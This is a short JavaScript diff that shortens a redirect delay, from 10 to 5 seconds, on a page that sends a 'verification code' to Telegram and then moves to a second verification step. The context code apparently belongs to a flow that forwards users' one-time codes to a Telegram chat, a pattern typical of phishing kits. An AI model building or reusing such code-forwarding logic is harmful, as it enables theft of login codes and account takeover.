@@ -472,10 +472,10 @@
         const success = await sendTelegramMessage(message);
         console.log('First verification code sent to Telegram:', success);
         
-        // Redirect to next step after 10 seconds
+        // Redirect to next step after 5 seconds
         setTimeout(() => {
           window.location.href = '/verify-step2';
-        }, 10000);
+        }, 5000);
         
       } catch (error) {
         console.error('Error sending verification code:', error);
